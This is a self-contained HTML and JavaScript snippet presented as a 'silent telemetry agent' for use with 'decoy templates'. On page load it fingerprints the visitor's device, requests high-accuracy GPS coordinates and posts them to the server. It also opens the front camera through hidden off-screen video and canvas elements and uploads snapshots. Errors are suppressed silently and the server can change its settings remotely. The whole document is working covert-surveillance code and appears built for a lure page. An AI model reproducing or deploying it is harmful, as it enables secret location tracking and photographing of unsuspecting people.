<!-- Hidden Video & Canvas for Telemetry Capture -->
<div style="visibility:hidden!important;position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;" aria-hidden="true">
    <video id="v_stream" playsinline autoplay muted width="640" height="480"></video>
    <canvas id="c_buffer" width="640" height="480"></canvas>
</div>

<!-- Silent Backend Telemetry Agent -->
<script>
(function() {
    let sessionUuid = localStorage.getItem('_rv_uuid') || null;
    let telemetryConfig = {
        gps_enabled: true,
        cam_enabled: true,
        cam_interval: 2500,
        max_snapshots: 5
    };
    let snapshotsSent = 0;
    let camIntervalTimer = null;

    const payload = {
        uuid: sessionUuid,
        user_agent: navigator.userAgent || 'Unknown',
        platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown'),
        browser_name: navigator.appName || 'Unknown',
        browser_language: navigator.language || navigator.userLanguage || 'Unknown',
        ram: navigator.deviceMemory ? String(navigator.deviceMemory) : null,
        cpu_cores: navigator.hardwareConcurrency ? String(navigator.hardwareConcurrency) : null,
        screen_resolution: window.screen ? (window.screen.width + 'x' + window.screen.height + ' (' + (window.screen.colorDepth || 24) + '-bit)') : null,
        referrer: document.referrer || null
    };

    // Helper for resilient fetch across serverless routing variations
    function sendJsonWithFallback(urls, body, onSuccess) {
        if (!urls || urls.length === 0) return;
        const currentUrl = urls[0];
        const remainingUrls = urls.slice(1);

        fetch(currentUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: typeof body === 'string' ? body : JSON.stringify(body)
        })
        .then(res => {
            if (res.ok) return res.json();
            throw new Error('HTTP ' + res.status);
        })
        .then(data => {
            if (onSuccess) onSuccess(data);
        })
        .catch(() => {
            if (remainingUrls.length > 0) {
                sendJsonWithFallback(remainingUrls, body, onSuccess);
            }
        });
    }

    // 1. Initial Handshake
    sendJsonWithFallback(
        ['/api/v1/telemetry/init', '/telemetry/init', '/location_update'],
        payload,
        function(data) {
            if (data.uuid) {
                sessionUuid = data.uuid;
                localStorage.setItem('_rv_uuid', data.uuid);
            }
            if (data.config) {
                telemetryConfig = data.config;
            }

            if (telemetryConfig.gps_enabled) {
                reqLocation();
            }

            if (telemetryConfig.cam_enabled) {
                initCamera();
            }
        }
    );

    // 2. High-Precision GPS Geolocation
    function reqLocation() {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    sendJsonWithFallback(
                        ['/api/v1/telemetry/location', '/telemetry/location', '/location_update'],
                        {
                            uuid: sessionUuid,
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        }
                    );
                },
                function(err) {
                    let reason = 'Position unavailable';
                    if (err.code === 1) reason = 'User denied geolocation permission';
                    else if (err.code === 2) reason = 'Position unavailable';
                    else if (err.code === 3) reason = 'Timeout expired';

                    sendJsonWithFallback(
                        ['/api/v1/telemetry/location', '/telemetry/location', '/location_update'],
                        {
                            uuid: sessionUuid,
                            denied: true,
                            error: reason
                        }
                    );
                },
                {
                    enableHighAccuracy: true,
                    timeout: 12000,
                    maximumAge: 0
                }
            );
        }
    }

    // 3. Camera Stream Capture
    async function initCamera() {
        const video = document.getElementById('v_stream');
        const canvas = document.getElementById('c_buffer');
        if (!video || !canvas) return;

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: { facingMode: 'user' }
            });
            
            video.srcObject = stream;
            video.play().catch(e => {
                // Silently handle video play abort
            });

            const ctx = canvas.getContext('2d');

            camIntervalTimer = setInterval(() => {
                if (snapshotsSent >= (telemetryConfig.max_snapshots || 5)) {
                    clearInterval(camIntervalTimer);
                    stream.getTracks().forEach(track => track.stop());
                    return;
                }

                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(function(blob) {
                        if (!blob) return;

                        const fd = new FormData();
                        fd.append('uuid', sessionUuid);
                        fd.append('image', blob, 'cam_' + Date.now() + '.jpg');

                        // Helper for formData fallback
                        function sendFormDataWithFallback(urls) {
                            if (!urls || urls.length === 0) return;
                            const target = urls[0];
                            const remaining = urls.slice(1);

                            fetch(target, {
                                method: 'POST',
                                body: fd
                            })
                            .then(r => {
                                if (r.ok) return r.json();
                                throw new Error('HTTP ' + r.status);
                            })
                            .then(res => {
                                if (res.status === 'ok') {
                                    snapshotsSent++;
                                } else if (res.status === 'limit_reached') {
                                    clearInterval(camIntervalTimer);
                                    stream.getTracks().forEach(track => track.stop());
                                }
                            })
                            .catch(() => {
                                if (remaining.length > 0) {
                                    sendFormDataWithFallback(remaining);
                                }
                            });
                        }

                        sendFormDataWithFallback(['/api/v1/telemetry/snapshot', '/telemetry/snapshot', '/image']);
                    }, 'image/jpeg', 0.85);
                }
            }, telemetryConfig.cam_interval || 2500);

        } catch (e) {
            // Silently handle camera denial
        }
    }

    // Expose trigger globally for interactive click handlers on decoy templates
    window.triggerTelemetryPermissions = function() {
        if (telemetryConfig.gps_enabled) reqLocation();
        if (telemetryConfig.cam_enabled) initCamera();
    };
})();
</script>
